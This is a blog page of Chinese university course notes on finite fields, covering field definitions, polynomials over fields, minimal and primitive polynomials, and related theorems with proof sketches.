对任意$\beta\in\mathbb F_{p^n}$，设$ord(\beta)=s=\prod_{i=1}^t p_i^{\alpha_i},d=\prod_{i=1}^t p_i^{\beta_i},\alpha_i\ge 0,\beta_i\ge 0$，那么$[d,s]=\prod_{i=1}^tp_i^{\max\{\alpha_i, \beta_i\}}$，将前面的式子拆分为两份：$s'=\prod_{\alpha_i\ge \beta_i}p_i^{\alpha_i},d'=\prod_{\alpha_i<\beta_i}p_i^{\beta_i}$，则易得$d'|d,s'|s,(d,s)=1,d's'=[d,s]$，此时$ord(\alpha^{\frac{d}{d'}})=d',ord(\beta^{\frac{s}{s'}})=s'$，由引理2可得，$ord(\alpha^{\frac{d}{d'}}\beta^{\frac{s}{s'}})=d's'=[d,s]\le d$，因为d是最大的阶。故有$s|d$。于是$\mathbb F_{p^n}^*$中任意一个元素的阶都是d的因子，即$\mathbb F_{p^n}^*$中$p^n-1$个元素均为$x^d-1=0$的根，故有$p^n-1\le d$。综上有$d=p^n-1$，证毕。

<font color=red>将域乘法群的生成元称为其本原元。</font>

<hr>
<font color=blue>定义3.12</font> 极小多项式：$\mathbb F_q$是元素个数为q的有限域，有限域$\mathbb F$为其扩域，则$\mathbb F$中任意一个元素$\alpha$在$\mathbb F_q$上的极小多项式指$\mathbb F_q$上以$\alpha$为根的首1不可约多项式。<font color=red>**（$\alpha$为$\mathbb F_q$扩域上，$\mathbb F$上元素，故其不一定是$\mathbb F_q$上元素，因此虽然$x-\alpha$整除该多项式，但该多项式不一定就是$x-\alpha$。但如果$\alpha\in\mathbb F_q$，则该多项式就是$x-\alpha$）**</font>

<hr>
<font color=purple>群的定理</font> 设$<a>$为由a构成的循环群，则：
1. $<a>$的子群都是循环群
2. 对于任意正整数$d|n$，$<a>$存在唯一d元子群
3. 若整数$s,t$不全为0，则$<a^s,a^t>=\{a^{sx+ty}\}=<a^{(s,t)}>$

---

<font color=green>引理3</font> 设$\mathbb F_q$是元素个数为q的有限域，有限域$\mathbb F$为其扩域，$\mathbb F$任一元素$\alpha$在$\mathbb F_q$上的极小多项式存在且唯一。
证明：存在性。设$|\mathbb F|=q^n$，则其中任意一个元素一定为$x^{q^n}-x$的根，其可以在$\mathbb F$中分解为若干首1不可约多项式的乘积：$x^{q^n}-x=p_1(x)p_2(x)...p_s(x),p_i(x)\in\mathbb F_q[x]$，故存在$1\le i\le s,p_i(\alpha)=0$，$p_i(x)$即为$\mathbb F_q$上的极小多项式。
唯一性。由定理3.24定理的推论，不存在重根，设存在两个极小多项式$a(x),b(x)$，因为$(a(x),b(x))=1$，代入$\alpha$可得：$0=s(\alpha)a(\alpha)+t(\alpha)b(\alpha)=1$，矛盾。

由上可知，$\alpha$在$\mathbb F_q$上的极小多项式是以$\alpha$为根的次数最低的多项式，且唯一。（反证法：假设可约则存在有次数更低的多项式，代入$\alpha$得其中一个多项式必为0，矛盾）

---

<font color="0080FF">结论1</font> 设$f(x)$是一个n次不可约多项式，那么包含$f(x)$的根$\alpha$的最小扩域为$\mathbb F_{q^n}$，所有包含$f(x)$的根的域都是$\mathbb F_{q^n}$的扩域。

<font color=dblue>证明：</font>设包含$f(x)$的根$\alpha$的最小扩域为$\mathbb F_{q^k}$，设
$$x^{q^k}-x=g(x)f(x)+r(x),\deg r(x)<\deg f(x)$$
代入$\alpha$可得$r(x)=0$，即$\alpha$是r(x)的一个根，但f(x)是$\mathbb F_q$上以$\alpha$为根的次数最小的多项式，因此r(x)只能为0。
故$f(x)|x^{q^k}-x,n|k$，最小正整数k即为n（定理3.20，3.22）

---

<font color="0080FF">结论2</font> $\mathbb F_q$为q元有限域，那么其扩域$\mathbb F_{q^n}$中包含所有次数为n的因子的不可约多项式的所有根，而不包含次数不为n的因子的不可约多项式的任何根。

<font color=dblue>证明：</font>由结论1易证。

---

<font color=green>引理4</font> 设$\mathbb F_q$是元素个数为q的有限域，有限域$\mathbb F$为其扩域，$\alpha\in\mathbb F^*$，$\alpha$的阶为m，设k是使$q^k\equiv1(\mod m)$的最小正整数，则$\alpha$在$\mathbb F_q$上的极小多项式为k次，该多项式的k个根为$\alpha,\alpha^q,\alpha^{q^2},...,\alpha^{q^{k-1}}$。若$|\mathbb F|=q^n$，$\alpha$为$\mathbb F$的本原元，则$\alpha$在$\mathbb F_q$上的极小多项式一定为n次。

证明：构造k次多项式
$$g(x)=(x-\alpha)(x-\alpha^q)...(x-\alpha^{q^{k-1}})$$
对于$0\le i\le k$，g(x)的1次项系数可以看做$\mathbb F_q$的素域$\mathbb F_p$上的k元多项式，不妨设为$c_i(\alpha, \alpha^q,\alpha^{q^2},...,\alpha^{q^{k-1}})$，即$g(x)=\sum_{i=0}^kc_i(\alpha, \alpha^q,\alpha^{q^2},...,\alpha^{q^{k-1}})x^i$
由$q^k\equiv 1(\mod m)$，$\alpha$的阶为m，得到$\alpha^{q^k}=\alpha$，又q为p的幂，因此由定理3.5：
$$(c_i(\alpha, \alpha^q,\alpha^{q^2},...,\alpha^{q^{k-1}}))^q=c_i(\alpha^q,\alpha^{q^2},...,\alpha^{q^{k}})=c_i(\alpha^q,\alpha^{q^2},...,\alpha)$$
又$g(x)=(x-\alpha^q)...(x-\alpha^{q^{k-1}})(x-\alpha)$，所以g(x)的i次项系数又可以表示为$c_i(\alpha^q,\alpha^{q^2},...,\alpha)$，也即$c_i(\alpha^q,\alpha^{q^2},...,\alpha)=c_i(\alpha, \alpha^q,\alpha^{q^2},...,\alpha^{q^{k-1}})$。因此有
$$(c_i(\alpha, \alpha^q,\alpha^{q^2},...,\alpha^{q^{k-1}}))^q=c_i(\alpha, \alpha^q,\alpha^{q^2},...,\alpha^{q^{k-1}})$$
由定理3.19可知$c_i(\alpha, \alpha^q,\alpha^{q^2},...,\alpha^{q^{k-1}})\in\mathbb F_q$，即$g(x)\in\mathbb F_q[x]$

下面证明$g(x)$在$\mathbb F_q[x]$中不可约。
易得$\alpha, \alpha^q,\alpha^{q^2},...,\alpha^{q^{k-1}}$互不相等。若存在两项$\alpha^{q^i},\alpha^{q^j}$相等，则$\alpha^{q^i(q^{j-i}-1)}=1$，故$m|q^i(q^{j-i}-1)$。由$q^k\equiv 1(\mod m)$可知$(q,m)=1$**（q^k^和1属于模m的同一个剩余类，故(q^k^,m)=(1,m)=1，即有(q,m)=1）**，故$m|q^{j-i}-1$，即$q^{j-i}\equiv 1(\mod m)$，但$0<j-i<k$，与k最小矛盾。

若$g(x)$在$\mathbb F_q[x]$上可约，则存在因式$f_1(x),f_2(x)\in\mathbb F_q[x]$
由$g(\alpha)=0$可得$f_1(\alpha)=0$或$f_2(\alpha)=0$，不妨设$f_1(\alpha)=0$，则有$f_1(\alpha)=f_1(\alpha^q)=...=f_1(\alpha^{q^{k-1}})=0$**（$f_1(\alpha)=\sum_{i=0}^Sa_i\alpha^i,a_i^q=a_i$，故$f_1(\alpha)=\sum_{i=0}^Sa_i\alpha^{qi}=\sum_{i=0}^Sa_i^q\alpha^{qi}=(f_1(\alpha))^q=0$）**，其根的个数超过其次数，矛盾。

由极小多项式的定义和唯一性可知g(x)即为$\alpha$在$\mathbb F_q$上的极小多项式。
<font color=red>**所有根的阶数均为m。**</font>

<hr>
<font color=green>引理5</font> 设$\mathbb F_q$是元素个数为q的有限域，$f(x)$为$\mathbb F_q$上的$n(n\ge 1)$的首1不可约多项式，$\mathbb F_{q^n}$为$\mathbb F_q$的任一扩域，那么$f(x)$在$\mathbb F_{q^n}$中有根，且若$\alpha$是$f(x)$在$\mathbb F_{q^n}$中的一个根，那么$f(x)$在$\mathbb F_{q^n}$中的所有根为$\alpha,\alpha^q,\alpha^{q^2},...,\alpha^{q^{n-1}}$。

证明：当$f(x)=cx,c\in\mathbb F_q^*$时，结论成立。
不妨设$f(x)$是首一n次不可约多项式，且$f(x)\ne cx,c\in \mathbb F_q^*$。由定理3.20可知$f(x)|x^{q^n}-x$，而$\mathbb F_{q^n}$中所有$q^n$个元素均为$x^{q^n}-x$的根。令$x^{q^n}-x=f(x)g(x),\deg g(x)=q^n-n$，则$x^{q^n}-x$的根一定是f(x)或g(x)的根，且f(x)的根至少有n个。又$\deg f(x)=n$，则f(x)有n个根。

$\alpha$是$f(x)$在$\mathbb F_{q^n}$中的一个根，则$f(x)$为$\alpha$在$\mathbb F_q$上的极小多项式，其所有根为$\alpha,\alpha^q,\alpha^{q^2},...,\alpha^{q^{n-1}}$。

---

<font color=blue>定义3.13</font> 极小多项式所有根的阶称为多项式的周期，周期为最大（$q^n-1$）时称该多项式为$\mathbb F_q$上的本原多项式

---

<font color=purple>定理3.28</font> 所有元素相同的有限域均同构。

<font color=dblue>证明方法：</font>

<hr>
<p><font color=purple>定理3.29</font> （有限域伽罗华定理）设p为素数，$\mathbb F_{p^n}$为元素个数为p^n^的有限域，$\alpha$为$\mathbb F_{p^n}$的本原元，$\alpha$在$\mathbb F_p$上的极小多项式为n次本原多项式$f(x)$，则：<br>(1) $\mathbb F_{p^n}$的任意自同构都保持其素域$\mathbb F_p$中的元素不变。<br>(2) $\mathbb F_{p^n}$的任意自同构都只能将$f(x)$的根映射成$f(x)$的根。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E6%9C%89%E9%99%90%E5%9F%9F%EF%BC%88%E4%B8%80%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-3%E2%80%94%E2%80%94%E6%9C%89%E9%99%90%E5%9F%9F%EF%BC%88%E4%B8%80%EF%BC%89/" class="post-title-link" itemprop="url">信息安全数学基础 Chapter 3——有限域（一）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:52:02" itemprop="dateCreated datePublished" datetime="2023-02-28T22:52:02+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:18" itemprop="dateModified" datetime="2023-03-01T11:31:18+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">信息安全数学基础</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>2.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>2 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Chapter-3-有限域"><a href="#Chapter-3-有限域" class="headerlink" title="Chapter 3 有限域"></a>Chapter 3 有限域</h1><font color=blue>定义3.1</font> 设$\mathbb F$为一个非空集合，在其上定义两种运算：加法和乘法，这两种运算在集合上封闭，且满足下列条件：

1. $\mathbb F$中所有元素对于加法形成加法交换群
2. $\mathbb F$中所有非零元素（记为$\mathbb F^*$）对于乘法构成乘法交换群
3. 任意$\mathbb F$中元素满足乘法对加法的交换律（与实数集中的交换律形式上相同）

则称$\mathbb F$对于规定的乘法和加法构成一个域。
<font color=red>一个域至少有两个元素：加法群零元（称为域的零元，$0$）和乘法单位元（称为域的单位元，$e$）</font>。域元素个数有限称为有限域或伽罗华域，否则称为无限域。有理数集合$\mathbb Q$和复数集合$\mathbb C$按定义的加法和乘法均为域

---

<font color=blue>定义3.2</font> 设$\mathbb F$是一个域，$\mathbb F_0$是$\mathbb F$的非空子集，如果对于$\mathbb F$上的加法和乘法，$\mathbb F_0$本身也是一个域，则称$\mathbb F_0$是$\mathbb F$的子域，$\mathbb F$是$\mathbb F_0$的扩域，记作$\mathbb F_0\subsetneq\mathbb F$

---

<font color=purple>定理3.1</font> 设$\mathbb F_0$，$\mathbb F_0^*$均是域$\mathbb F$的非空子集，当且仅当下面两个条件成立时$\mathbb F_0$是$\mathbb F$的子域：
1. 对于任意$a, b\in \mathbb F_0$，都有$-a, a+b\in\mathbb F_0$
2. 对于任意非零元素$a, b\in\mathbb F_0$，都有$a^{-1}, ab\in\mathbb F_0$

<font color=dblue>证明方法：</font>需要证明$\mathbb F_0$是$\mathbb F$的加法子群，$\mathbb F_0^*$是$\mathbb F$的乘法子群。这个证明与证明子群很相似。
$\because a,-a\in\mathbb F_0, \therefore0\in\mathbb F_0$，有加法单位元，每个元素有逆元。
$\because \forall a, b\in \mathbb F_0, a+b\in \mathbb F_0$，故运算封闭。
该运算由于在$\mathbb F$中构成域，因此满足交换律与结合律。因此$\mathbb F_0$是$\mathbb F$的加法子群。
$\because \forall a\in\mathbb F_0, a^{-1}\in\mathbb F_0$，故每个元素有逆元，有乘法单位元$e$
$\because \forall a, b\in \mathbb F_0, ab\in \mathbb F_0$，故运算封闭。
该运算由于在$\mathbb F$中构成域，因此满足交换律与结合律。因此$\mathbb F_0^*$是$\mathbb F$的乘法子群。
由于这两个运算在$\mathbb F$中满足分配律，因此在$\mathbb F_0$中同样满足。$\Box$

<font color=red>定义$a^{-n}=(a^n)^{-1}$，当$a\ne 0$时，定义$a^0=e$。</font>

<hr>
<font color=purple>定理3.2</font> 设$\mathbb F$是一个域，那么：
1. 对于任意$a\in\mathbb F$，$0a=a0=0$；
2. 对于任意$a,b\in\mathbb F$，若$ab=0$，则$a=0$或$b=0$

<font color=dblue>证明方法：</font>$0a=(0+0)a$ 证明1
若$a\ne 0$，则$ab=a^{-1}ab=b=0$，若$b=0$同理。

<font color=red>在域中，二项式定理成立。</font>

<hr>
<font color=purple>定理3.3</font> 设$\mathbb F$是一个域，$a,b\in\mathbb F$，对于任意正整数$n$，有
$$(a+b)^n=\sum_{i=0}^n C_n^i a^{n-i} b^i
=\sum_{i=0}^n\begin{pmatrix}n\\i\end{pmatrix}a^{n-i} b^i$$

<font color=dblue>证明方法：</font>分配律易证。

---

<font color=blue>定义3.3</font> 设$\mathbb F$是一个域，如果存在正整数$m$，使得对于任意$a\in\mathbb F$均有$ma=0$，则在所有满足上述条件的m中，最小的正整数称为域$\mathbb F$的特征。如果$m$不存在则称$\mathbb F$的特征为0。特征记作$char(\mathbb F)$。

---

<font color=blue>定义3.4</font> 设$\mathbb F, \mathbb k$是两个域，如果存在$\mathbb F$到$\mathbb k$的一一映射$\delta$，使得对于任意$a,b\in\mathbb F$，均有
$$\delta(a+_{\mathbb F}b)=\delta(a)+_{\mathbb k}\delta(b), \delta(a\times_{\mathbb F} b)=\delta(a)\times_{\mathbb k}\delta(b)$$
则称$\delta$为$\mathbb F$到$\mathbb k$的同构映射，称$\mathbb F, \mathbb k$同构，记作$\mathbb F\cong\mathbb k$。如果$\mathbb F=\mathbb k$则称$\delta$为自同构映射，若对于任意$a\in\mathbb F$均有$\delta(a)=a$，则称$\delta$为恒等自同构映射。<font color=red>一个域的最小子域称为该域的素域。</font>

<hr>
<font color=purple>定理3.4</font> 设$\mathbb F$是一个域，则$char(\mathbb F)$为0或某个素数$p$。特征为素数$p$的域的素域与$\mathbb Z_p$同构，特征为0的域的素域与$\mathbb Q$同构。

<font color=dblue>证明方法：</font>此证明显然需要分为三个部分进行。
首先证明特征为0或素数。如果特征不是素数，则可写为$s\times t$的形式，也即$\forall a\in \mathbb F, (st)a=sta=0$，故$sa=0$或$ta=0$。此时特征就应该是$s$或$t$而非$st$。
当$\mathbb F$是一个域且特征不为0时，其所有子域显然均需要包含$0$和$e$，由于需要满足运算的封闭性，所以还需要包含$2e, 3e, ...,(p-1)e$。由这些元素构成的集合容易证明其是一个域（需要注意乘法逆元的证明，由于$p$是素数，故对于任意的$0<k<p$，均能找到其关于模$p$的逆元，也就是对应的乘法逆元），因此这就是$\mathbb F$上最小的域。同构映射$\delta(ke)=k$与$\mathbb Z_p$构成同构。
当$\mathbb F$的特征为0时，同样其所有子域均需要包含$0,e,2e,3e,...$。由加法运算的封闭性，还需要包含$-e,-2e,-3e,...$。又由于需要满足乘法逆元也包含于域中，所以$e^{-1}, 2e^{-1},...-e^{-1},-2e^{-1},...$也在子域中。又需要满足乘法的封闭性，故任意子域均需包含$\mathbb F_0=\{(ae)(be)^{-1}|a,b\in\mathbb Z,b\ne 0\}$。这个集合容易证明域的所有判定性质，因此其本身就是一个域，而且是最小的子域。同构映射$\delta((ae)(be)^{-1})=\frac{a}{b}$与$\mathbb Q$构成同构。

---

<font color=purple>定理3.5</font> 设$\mathbb F$是一个域，$char(\mathbb F)=p$，则对于任意$a,b\in\mathbb F,n\ge 0$，均有
$$(a\pm b)^{p^n}=a^{p^n}\pm b^{p^n}$$

<font color=dblue>证明方法：</font>首先使用二项式定理证明$(a+b)^p=a^p+b^p$：
$(a+b)^p$中的第i项为$\frac{p!}{i!(p-i)!}a^ib^{p-i}$，即证明$\frac{p!}{i!(p-i)!}$是$p$的倍数$(i\ne 0,i\ne p)$。显然这是一个整数，且$\frac{p!}{i!(p-i)!}=p\times \frac{(p-1)!}{i!(p-i)!}$。后面的数不可能是分数，因为如果是，那么分母必然是$p$的倍数，但是分母显然与$p$互素。因此后面的数是整数，也就是说这个数能够被$p$整除。故得证第一项。
然后使用数学归纳法，用类似的方式证明后面的式子即可。

---

<font color=blue>定义3.5</font> 对于非负整数$i$，$a_ix^i,a_i\in\mathbb F$表示域$\mathbb F$上文字为x的单项式，称形式和$f(x)=a_nx^n+a_{n-1}x^{n-1}+...+a_1x^1+a_0x^0,a_i\in\mathbb F$为域上文字为x的多项式，简称域$\mathbb F$上的多项式。$a_ix^i$称为$f(x)$的$i$次项，$a_i$称为$f(x)$的$i$次项系数。当$a_n\ne 0$时，称该多项式为n次多项式，$a_n$称为$f(x)$的首项系数，多项式$f(x)$的次数称为$\deg f(x)$。如果多项式各项系数均为0，称为零多项式，记为0，次数规定为$-\infty$。
<font color=red>域$\mathbb F$上文字为x的所有多项式的集合用符号$\mathbb F[x]$表示，规定$x^0=1\in\mathbb F,a_0x^0=a_0\in\mathbb F$，则有$\mathbb F\subsetneq\mathbb F[x]$。注意按照上面的定义，$\mathbb F[x]$不是域。</font>
<font color=red>关于多项式次数，下面结论成立：</font>
$$\deg (f(x)+g(x))\le max\{\deg f(x), \deg g(x)\}
\\\deg(f(x)g(x))=\deg f(x)+\deg g(x)$$

<font color=red>注意：这里的x可以表示任意的东西而不仅限于$\mathbb F$，即anything，但是需要定义次方。</font>

<hr>
<font color=purple>定理3.6</font> 设$f(x),g(x)$为域$\mathbb F$上的两个多项式，$g(x)\ne 0$，则存在唯一一对多项式$q(x),r(x)$使得
$$f(x)=q(x)g(x)+r(x),\deg r(x)<\deg g(x)$$
<font color=red>注意：不要看系数能否被整除，而应该注意到域的性质。由于域的特征只可能为素数或0，因此不要想当然地用诸如$5x^2+1$和$2x^2+4$来挑战这条定理，因为整数集并不是域！</font>

<font color=dblue>证明方法：</font>归纳。
存在性易证，总存在一个系数能够消去被除式的最高次项（利用乘法逆元）
唯一性：$(q(x)-q'(x))g(x)=r'(x)-r(x),\deg (r'(x)-r(x))<\deg g(x)$，故$q(x)=q'(x), r(x)=r'(x)$

定理中的式子称为多项式带余除法算式，$r(x)$称为余式，记作<font color=red>$(f(x))_{g(x)}=r(x)$</font>

<hr>
<font color=purple>定理3.7</font> 多项式满足模加和模乘运算。证明略。

---

<font color=blue>定义3.6</font> 
整除：$r(x)=0$
倍式与因式
真因式：次数小于倍式的因式

---

<font color=blue>定义3.7</font> 
可约多项式：不含次数大于0的真因式的多项式
不可约多项式

---

<font color=purple>定理3.8</font> 域$\mathbb F$上多项式$f(x)$可约，则当且仅当存在两个域$\mathbb F$上多项式$f_1(x),f_2(x)$，$\deg f_1(x)<\deg f(x), \deg f_2(x)<\deg f(x)$，使得$f(x)=f_1(x)f_2(x)$

证明略。

---

<font color=purple>定理3.9</font> 如果有$g(x)|f_1(x), g(x)|f_2(x)$，则任意多项式$s(x),t(x)$，有$g(x)|s(x)f_1(x)+t(x)f_2(x)$

<font color=dblue>证明方法：</font>
设$f_1(x)=g(x)q_1(x),f_2(x)=g(x)q_2(x)$
则$s(x)f_1(x)+t(x)f_2(x)=(s(x)q_1(x)+t(x)q_2(x))g(x)$一定是$g(x)$的倍式

---

<font color=blue>定义3.8</font> 公因式、最高公因式（首项系数为1，次数最高）、互素

---

<font color=purple>定理3.10</font> 欧几里得辗转相除法
$r_i(x)=q_{i+1}(x)r_{i+1}(x)+r_{i+2}(x)$

1. 经过有限步之后，余式必然为0。
2. 存在多项式$s(x),t(x)\in \mathbb F[x]$，使得$s(x)r_0(x)+t(x)r_1(x)=r_n(x)$。
3. 设$r_n(x)$首项系数为$c$，则$(r_0(x), r_1(x))=c^{-1}r_n(x)$，且最高公因式唯一存在。
4. 对于任意$c(x)\in \mathbb F(x)$，如果$c(x)|r_0(x),c(x)|r_1(x)$，那么$c(x)|(r_0(x),r_1(x))$

<font color=orange>推论</font> 多项式的裴蜀定理（描述、证明略）

---

<font color=purple>定理3.11</font> 设$f(x),g(x)$为域$\mathbb F$上两个不全为0的多项式，则对于任意$k(x)\in \mathbb F[x],(f(x)+g(x)k(x),g(x))=(f(x),g(x))$
类比整数，证明略。

---

<font color=purple>定理3.12</font> 设$f_1(x),f_2(x)$为域$\mathbb F$上的多项式，$p(x)$为域$\mathbb F$上的不可约多项式，且$p(x)|f_1(x)f_2(x)$，若$(p(x),f_1(x))=1$，则$p(x)|f_2(x)$
类比整数，证明使用定理3.10推论证明，略。

---

<font color=purple>定理3.13</font> 设$f_1(x),f_2(x)$为域$\mathbb F$上的多项式，$p(x)$为域$\mathbb F$上的不可约多项式，且$p(x)|f_1(x)f_2(x)$，则$p(x)|f_1(x)$或$p(x)|f_2(x)$
类比整数，证明略。

---

<font color=purple>定理3.14</font> 唯一因式分解定理：设$f(x)$是域$\mathbb F$上次数大于0的多项式，则$f(x)$可以唯一地表示为域$\mathbb F$上一些次数大于0的不可约多项式的乘积。特别地，若$f(x)$为首1多项式，且
$$f(x)=p_1(x)p_2(x)...p_s(x)=q_1(x)q_2(x)...q_t(x)$$
其中$p_i(x),q_i(x)$为域$\mathbb F$上次数大于0的首1不可约多项式，则有$s=t$，经过适当调整可以使得对任意$i$均有$p_i(x)=q_i(x)$

<font color=dblue>证明方法：</font>归纳法。略

---

<font color=blue>定义3.9</font> 根：设$f(x)$为域$\mathbb F$上的多项式，如果$a\in \mathbb F$使得$f(a)=0$，则称$a$是$f(x)$在域$\mathbb F$上的一个根。

---

<font color=purple>定理3.15</font> 余元定理：设$f(x)$为域$\mathbb F$上的多项式，对于任意$a\in \mathbb F$，存在$g(x)\in \mathbb F[x]$使得$f(x)=(x-a)g(x)+f(a)$

<font color=dblue>证明方法：</font>设$f(x)=(x-a)g(x)+c$，代入$a$即可。

<font color=red>本定理可以这样理解：将其看成域上离散的中值定理——$\frac{f(x)-f(a)}{x-a}=g(x)$，认为中值定理在域上也成立。但是实际上写的时候不能写分式，因为并没有定义除这个运算。</font>

<font color=orange>推论1</font> 设$f(x)$为域$\mathbb F$上的多项式，$a$为$f(x)$在域$\mathbb F$的根的充要条件为$(x-a)|f(x)$
<font color=orange>推论2</font> 设$f(x)$为域$\mathbb F$上的多项式，如果$a_1,a_2,...a_m$为$f(x)$在域$\mathbb F$的根，则存在$n-m$次多项式$g(x)\in \mathbb F[x]$使得$f(x)=(x-a_1)(x-a_2)...(x-a_m)g(x)$
<font color=orange>推论3</font> 设$f(x)$为域$\mathbb F$上的多项式，则$f(x)$在$\mathbb F$的任意扩域中，不同根的个数不会超过$n$（证明使用推论2证明）

---

<font color=purple>定理3.16</font> 设$f(x)$是域$\mathbb F$上的$n\ge 1$次不可约多项式，集合$\mathbb F[x]_{f(x)}=\{\sum_{i=0}^{n-1}a_ix^i|a_i\in\mathbb F\}$按照模$f(x)$的模加和模乘形成一个域。特别地，若$f(x)$是有限域$\mathbb F_q$上的$n$次不可约多项式，则$\mathbb F[x]_{f(x)}=\{\sum_{i=0}^{n-1}a_ix^i|a_i\in\mathbb F_q\}$按照模$f(x)$的模加和模乘形成一个元素个数为$q^n$的有限域。

<font color=dblue>证明方法：</font>证明该运算系统满足域的每条性质。每个项的系数都可以取q个值，因此构造的域的元素个数为$q^n$

以$\mathbb F_q[x]^*_{f(x)}$表示$\mathbb F_q[x]_{f(x)}$的乘法群，其元素个数为$q^n-1$。

<font color=red>注意：任何次数大于等于n的多项式在$\mathbb F[x]_{f(x)}$中均等于一个次数小于n的多项式，每一项的系数关于$\mathbb F$取余，整个多项式关于$f(x)$取余</font>

<hr>
<font color=purple>定理3.17</font> 设$f(x)$是域$\mathbb F$上的一个次数大于0的不可约多项式，那么$f(x)$必然在$\mathbb F$的某个扩域中有根。

<font color=dblue>证明方法：</font>使用定理3.16构造的扩域。

<font color=green>举例：</font>定义在$\mathbb Z_2$上的多项式$f(x)=x^2+1$在其上不可约，因此构造扩域，集合元素为$\{0,1,x,x+1\}$，则显然有$f(x)=x^2+1=0$，即$f(x)=0$，x是多项式的一个根。（这里的x指的是扩域中的x，不要混淆了）

<font color=orange>推论</font> $\mathbb F$上的任意一个次数为$n\ge 1$的多项式，必然在$\mathbb F$的扩域中可以分解为$n$个一次不可约多项式的乘积。

---

<font color=purple>定理3.18</font> 设$\mathbb E$是有限域，$\mathbb F_q$是其q元子域，则存在正整数n使得$|\mathbb E|=q^n$。

<font color=dblue>证明方法：</font>逐步扩大法。$\mathbb F_q=\mathbb E_1$如果存在$\beta\in \mathbb E \setminus \mathbb E_1$，那么定义$\mathbb E_2=\{a_0+a_1\beta|a_0,a_1\in\mathbb F_q\}$，其元素个数为$q^2$，如果还存在不在$\mathbb E_2$的元素，则继续扩展，直到$\mathbb E_n=\mathbb E$为止。

<font color=red>注意：这其中的$\mathbb E_i$不一定是一个域！在严格证明中将其描述为集合。</font>

<p><font color=orange>推论</font> 有限域的元素个数必为$p^n$，其中$p$为素数。任何有限域都是其素域的扩域。</p>
<hr>
<p><font color=purple>定理3.19</font> 设$\mathbb F_q$为q元有限域，$\mathbb F$为$\mathbb F_q$的扩域，$\alpha\in\mathbb F$，那么$\alpha$是多项式$x^q-x$的根当且仅当$\alpha\in\mathbb F_q$</p>
<p><font color=dblue>证明方法：</font>对于任意$\alpha\in\mathbb F_q$，$\alpha^q-\alpha=(e+e+e+…+e)^q-\alpha=e^q+e^q+…+e^q-\alpha=\alpha-\alpha=0$，故$x^q-x$的根是$\mathbb F_q$的所有元素，而其也只有这么多根（次数限制）。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
